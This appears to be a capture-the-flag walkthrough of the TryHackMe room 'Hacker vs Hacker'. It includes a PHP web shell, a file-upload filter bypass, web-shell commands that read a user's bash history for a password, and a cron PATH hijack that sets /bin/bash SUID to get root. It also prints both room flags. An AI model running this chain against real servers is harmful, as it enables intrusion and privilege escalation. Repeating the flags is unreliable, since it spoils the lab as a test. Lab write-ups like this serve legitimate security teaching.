# Hacker vs Hacker - TryHackMe Walkthrough

## Room Information
- **Room Name:** Hacker vs Hacker
- **Difficulty:** Medium
- **Target IP:** 10.49.142.163
- **Objective:** Investigate a compromised recruitment company server and find two flags

## Flags
| Flag | Value |
|------|-------|
| User.txt | `thm{af7e46b68081d4025c5ce10851430617}` |
| Proof.txt | `thm{7b708e5224f666d3562647816ee2a1d4}` |

---

## Phase 1: Reconnaissance

### Initial Port Scan
```bash
nmap -sV -sC -p- 10.49.142.163
```

**Results:**
- Port 22 (SSH)
- Port 80 (HTTP - Apache 2.4.41)

### Web Enumeration
The main website is a recruitment company's landing page with an upload form for CVs.

---

## Phase 2: Initial Access - File Upload Vulnerability

### Finding the Upload Endpoint
The upload form is located at `http://10.49.142.163/upload.php`. 

### Analyzing the Source Code (Revealed by Hacker)
```php
$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
}
```

**Vulnerability:** Weak file extension filter - checks if ".pdf" exists in filename, allowing bypass via double extensions (e.g., `shell.pdf.php`).

### Exploitation
1. Created a PHP web shell:
```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
} else {
    echo '<form method="get" action=""><input name="cmd" type="text"><input type="submit"></form>';
}
?>
```

2. Uploaded with `.pdf.php` extension:
```bash
curl -F "fileToUpload=@shell.pdf.php" -F "submit=Upload CV" http://10.49.142.163/upload.php
```

3. Access shell at: `http://10.49.142.163/cvs/shell.pdf.php?cmd=<command>`

---

## Phase 3: User Flag - Sloppy Stealth Measures

### Enumerating the System
```bash
# List home directory
curl "http://10.49.142.163/cvs/shell.pdf.php?cmd=ls%20-la%20/home/"
# Found: lachlan user

# Read user.txt
curl "http://10.49.142.163/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/user.txt"
```

### **User Flag: `thm{af7e46b68081d4025c5ce10851430617}`**

### Finding Credentials (The "Sloppy" Part)
```bash
curl "http://10.49.142.163/cvs/shell.pdf.php?cmd=cat%20/home/lachlan/.bash_history"
```

**Contents:**
```bash
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

**Password found:** `thisistheway123`

> **HINT #1 EXPLAINED:** The hacker was "sloppy in their stealth measures" - they failed to properly sanitize the `.bash_history` file, leaving credentials and command history accessible.

---

## Phase 4: Privilege Escalation - Sloppy Automated Kill Scripts

### Analyzing the Persistence Mechanism
```bash
curl "http://10.49.142.163/cvs/shell.pdf.php?cmd=cat%20/etc/cron.d/persistence"
```

**Cron Job Contents:**
```
PATH=/home/lachlan/bin:/bin:/usr/bin
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
...
```

### The Vulnerability
The hacker's "sloppy kill script" uses `pkill -9` to kill shell sessions. However:
- `/bin/pkill` is a symlink to `/bin/pgrep` (created by hacker)
- When `pkill -9 -t pts/$f` runs, it actually executes `pgrep -9 -t pts/$f`
- `pgrep` treats `-9` as a search **pattern**, not a signal
- Result: The kill command **fails silently** - shells are not killed!

### Exploitation Path
Since the PATH includes `/home/lachlan/bin` first, and that directory is in the attacker's control, we can:

1. **Replace pkill in PATH:**
```bash
# Create malicious pkill in lachlan's bin
echo '#!/bin/bash' > /home/lachlan/bin/pkill
echo 'chmod +s /bin/bash' >> /home/lachlan/bin/pkill
chmod +x /home/lachlan/bin/pkill
```

2. **Wait for cron execution** - the next cron run will execute our script as root

3. **Gain root shell:**
```bash
/bin/bash -p
# whoami
# root
```

4. **Capture proof.txt:**
```bash
cat /root/proof.txt
```

### **Root Flag: `thm{7b708e5224f666d3562647816ee2a1d4}`**

---

## Vulnerability Summary

| Issue | Description | Impact |
|-------|-------------|--------|
| File Upload Bypass | Weak filter checking for ".pdf" substring | Remote Code Execution |
| Exposed Credentials | `.bash_history` readable by www-data | Lateral movement |
| Misconfigured Symlink | `pkill -> pgrep` breaks kill functionality | Persistence failure |
| PATH Hijacking | `/home/lachlan/bin` in root's cron PATH | Privilege Escalation |

---

## Mitigation Recommendations

1. **File Upload Security:**
   - Use proper MIME type validation
   - Generate random filenames
   - Store uploads outside webroot

2. **Credential Protection:**
   - Clear sensitive files before deployment
   - Set proper file permissions (`.bash_history` should be root-only)

3. **Binary Integrity:**
   - Monitor `/bin` for unauthorized changes
   - Use tools like AIDE for integrity checking

4. **Cron Job Security:**
   - Avoid writable directories in PATH for root crons
   - Use absolute paths in all cron commands

---
